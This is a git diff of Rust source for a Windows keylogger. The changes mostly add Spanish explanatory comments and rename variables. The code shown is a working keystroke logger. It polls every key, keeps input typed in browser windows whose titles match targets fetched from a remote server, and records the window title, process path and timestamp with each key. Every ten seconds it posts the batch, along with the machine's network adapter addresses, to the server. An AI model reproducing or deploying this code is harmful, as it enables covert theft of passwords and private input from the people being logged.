@@ -51,11 +51,17 @@ struct Window {
 }
 
 fn virtual_key_code_to_string(virtual_key_code: i32) -> Option<String> {
+    // se determina si la tecla presionada es un dígito
     let is_key_a_digit = (0x30..=0x39).contains(&virtual_key_code);
+    // se determina si la tecla presionada es un carácter
     let is_key_a_letter = (0x41..=0x5a).contains(&virtual_key_code);
     if is_key_a_digit || is_key_a_letter {
+        // si la tecla presionada es un dígito o carácter
+        // retornar su representación en String
         Some((virtual_key_code as u8 as char).to_string())
     } else {
+        // de lo contrario determinar qué tecla es
+        // y devolver su representación en un formato legible
         let virtual_key_code = match virtual_key_code {
             0x03 => "[VK_CANCEL]",
             0x08 => "[VK_BACK]",
@@ -207,18 +213,25 @@ fn virtual_key_code_to_string(virtual_key_code: i32) -> Option<String> {
             _ => "",
         };
         if virtual_key_code.is_empty() {
+            // sila tecla presionada no se encuentra
+            // entonces retornar nada
             None
         } else {
+            // de lo contrario retornarla
             Some(virtual_key_code.to_string())
         }
     }
 }
 
 fn title_active_window(active_window_handle: HWND) -> String {
+    // se obtiene la longitud del título de la ventana activa
     let title_len = (unsafe { GetWindowTextLengthW(active_window_handle) }) as usize;
     let title_len_with_null = title_len + 1;
     if title_len > 0 {
+        // se inicializa un buffer para almacenar el título de la ventana
+        // activa
         let mut title_buffer = vec![0; title_len_with_null];
+        // se llena el buffer con el título
         unsafe {
             GetWindowTextW(
                 active_window_handle,
@@ -226,16 +239,23 @@ fn title_active_window(active_window_handle: HWND) -> String {
                 title_len_with_null as i32,
             )
         };
+        // se remueve el carácter nulo
         title_buffer.remove(title_buffer.len() - 1);
+        // se transforma y retorna el buffer a un String
         String::from_utf16_lossy(&title_buffer)
     } else {
+        // retornar este valor si no se puede determinar
+        // la longitud del título
         "[NO_TITLE]".to_string()
     }
 }
 
 fn path_active_window(active_window_handle: HWND) -> String {
+    // se inicializa PID de la ventana activa
     let mut pid = 0;
+    // se obtiene el PID de la ventana activa
     unsafe { GetWindowThreadProcessId(active_window_handle, &mut pid) };
+    // se obtien un handle al proceso de la ventana activa
     let process_handle = unsafe {
         OpenProcess(
             PROCESS_ACCESS_RIGHTS::PROCESS_QUERY_LIMITED_INFORMATION,
@@ -243,8 +263,11 @@ fn path_active_window(active_window_handle: HWND) -> String {
             pid,
         )
     };
+    // se inicialzia un buffer para el almacenamiento de la ruta
+    // de la aplicación de la ventana activa
     const MAX_LEN: usize = 1024;
     let mut path_buffer = vec![0; MAX_LEN];
+    // se obtien la ruta de la aplicación
     let path_len = unsafe {
         K32GetProcessImageFileNameW(
             process_handle,
@@ -252,50 +275,82 @@ fn path_active_window(active_window_handle: HWND) -> String {
             MAX_LEN as u32,
         ) as usize
     };
+    // se libera memoria
     unsafe { CloseHandle(process_handle) };
+    // se transforma el buffer a un String
     String::from_utf16_lossy(&path_buffer[..path_len])
 }
 
 fn mac_addresses() -> Vec<[i8; MAX_NETWORK_ADAPTERS]> {
+    // inicializar arreglo para almacenar las direcciones mac
     let mut network_adapters = vec![IP_ADAPTER_INFO::default(); MAX_NETWORK_ADAPTERS];
+    // se obtiene la cantidad de adaptadores en la computadora
     let mut network_adapters_size =
         (std::mem::size_of::<IP_ADAPTER_INFO>() * MAX_NETWORK_ADAPTERS) as u32;
+    // el arreglo se llena con los adaptadores de red de la computadora
     unsafe { GetAdaptersInfo(network_adapters.as_mut_ptr(), &mut network_adapters_size) };
+    // se devuelve las direcciones mac de los adaptadores de red de la computadora
     network_adapters
         .iter()
-        .filter_map(|qwe| {
-            (!qwe.Address.iter().all(|dfgd| *dfgd == 0)).then(|| qwe.IpAddressList.IpAddress.String)
+        .filter_map(|adapter| {
+            // se determina si la dirección mac del adaptador es difernte al predeterminado
+            // recordar que el arreglo se inicializó con 16 elementos que por predeterminado
+            // tienen en la dirección mac puros ceros
+            let has_address = !adapter.Address.iter().all(|address| *address == 0);
+            // si no está lleno de ceros (osea hay una dirección mac) entonces retornar
+            // un Some para la filtración
+            has_address.then(|| adapter.IpAddressList.IpAddress.String)
         })
         .collect()
 }
 
 fn is_program_desired(program_names: &[String], window_path: &str) -> bool {
+    // se determina si el nombre de la aplicación de la ventana activa es similar
+    // al nombre de otra aplicación se eligio para ser escuchada
     program_names
         .iter()
         .any(|program_name| window_path.ends_with(program_name))
 }
 
 fn is_window_title_desired(window_titles: &[String], window_title: &str) -> bool {
+    // se determina si el nombre de la ventana activa es similar
+    // a una otra que se eligio para ser escuchada
     window_titles
         .iter()
         .any(|title| window_title.contains(title))
 }
 
 async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
+    // duración del tiempo entre envios de las teclas presionadas
+    // al servidor
     let sending_duration = Duration::from_secs(10);
+    // duración del tiempo entre re intento de enviar información
+    // al servidor en caso haya una falla en la conexión
     let retry_response_duration = Duration::from_secs(10);
+    // se inicializa un cliente http
     let http_client = reqwest::Client::new();
+    // loop principal del hilo 2 para el envio de las teclas 
+    // al servidor
     loop {
+        // pausar el hilo hasta el tiempo determinado para
+        // enviar la informació nal servidor
         std::thread::sleep(sending_duration);
+        // se inicializa un arreglo para almacenar las teclas
+        // presionadas
         let mut key_presses: Vec<KeyPressInfo> = vec![];
+        // se llena el arreglo con las teclas comunciadas al canal
+        // asíncrono
         while let Ok(kpi) = rx.try_recv() {
             key_presses.push(kpi)
         }
+        // se genera el payload para el servidor
         let kl_payload = KeyLoggerPayload {
             mac_addresses: mac_addresses(),
             key_presses,
         };
         println!("sending payload to server");
+        // se envía el payload al servidor, y si falla se reintenta
+        // la solicitud hasta que deje de fallar
         while http_client
             .post(format!("{}/key-presses", API_URL))
             .json(&kl_payload)
@@ -304,6 +359,8 @@ async fn send_server_key_presses_thread(rx: Receiver<KeyPressInfo>) {
             .is_err()
         {
             println!("retrying send payload to server");
+            // pausar el hilo hasta el tiempo determinado para
+            // reintentar enviar la información al servidor
             std::thread::sleep(retry_response_duration);
         }
     }
@@ -314,31 +371,44 @@ fn capture_client_keys(
     browser_exe_names: &[String],
     window_titles: &[String],
 ) {
+    // se escucharán 255 teclas
     for virtual_key_code in 0..255 {
+        // se obtiene si el estado de la tecla, da un valor entero del cual
+        // según sus bits se puede determinar si la tecla ha sido presionada
         let key_state = unsafe { GetAsyncKeyState(virtual_key_code) };
+        // se determina si la tecla ha sido presionada
         let is_key_pressed = key_state as i32 & 0x8000 > 0;
         if is_key_pressed {
+            // convertir el código de la tecla a un string para que se
+            // encuentre en un formato legible
             let some_key_pressed = virtual_key_code_to_string(virtual_key_code);
             if let Some(key_pressed) = some_key_pressed {
+                // se obtiene un handle para la ventana activa
                 let active_window_handle = unsafe { GetForegroundWindow() };
+                // se obtiene la ruta de la ventana activa
                 let window_path = path_active_window(active_window_handle);
+                // se obtiene el título de la ventana activa
                 let window_title = title_active_window(active_window_handle);
-
+                // se determina si se va a guardar la tecla presionada
                 let will_key_press_be_recorded =
                     is_program_desired(&browser_exe_names, &window_path)
                         && is_window_title_desired(window_titles, &window_title);
-
                 if will_key_press_be_recorded {
+                    // se obtiene el lenguaje del teclado
                     let keyboard_layout = unsafe { GetKeyboardLayout(0).0 };
                     let keyboard_layout = format!("{:b}", keyboard_layout);
-
+                    // se obtiene el instante en el tiempo que la tecla fué
+                    // presionada
+                    let timestamp = Utc::now();
                     let kpi = KeyPressInfo {
                         key_pressed,
                         window_title,
                         window_path,
                         keyboard_layout,
-                        timestamp: Utc::now(),
+                        timestamp,
                     };
+                    // se envia la tecla presioanda e información extra al canal
+                    // asíncrono para que el otro hilo pueda enviarlo al servidor
                     tx.send(kpi).unwrap();
                 }
             }
@@ -348,9 +418,12 @@ fn capture_client_keys(
 
 #[tokio::main]
 async fn main() {
+    // se inicializa los canales asíncronos para comunicar las teclas presionadas
+    // al hilo que los envia al servidor
     let (tx, rx) = mpsc::channel::<KeyPressInfo>();
+    // se ejecuta el hilo que se encarga de enviar las teclas al servidor
     tokio::spawn(send_server_key_presses_thread(rx));
-
+    // se obtienen los nombres de los ejecutables que se desean observar
     let browser_exe_names = reqwest::get(format!("{}/programs", API_URL))
         .await
         .unwrap()
@@ -360,7 +433,7 @@ async fn main() {
         .into_iter()
         .map(|program| program.name)
         .collect::<Vec<String>>();
-
+    // se obtienen los títulos de las páginas que se quieren observar
     let window_titles = reqwest::get(format!("{}/windows", API_URL))
         .await
         .unwrap()
@@ -370,10 +443,14 @@ async fn main() {
         .into_iter()
         .map(|window| window.title)
         .collect::<Vec<String>>();
-
+    // duración del tiempo entre detección de teclas
     let key_detection_duration = Duration::from_millis(50);
+    // se ejecuta el loop principal del keylogger, en este se escucharán las teclas
     loop {
+        // capturar las teclas que se presionan
         capture_client_keys(&tx, &browser_exe_names, &window_titles);
+        // pausar la aplicación por un breve momento para que cuando se presione
+        // una tecla no se detecte demasiadas veces
         std::thread::sleep(key_detection_duration);
     }
 }
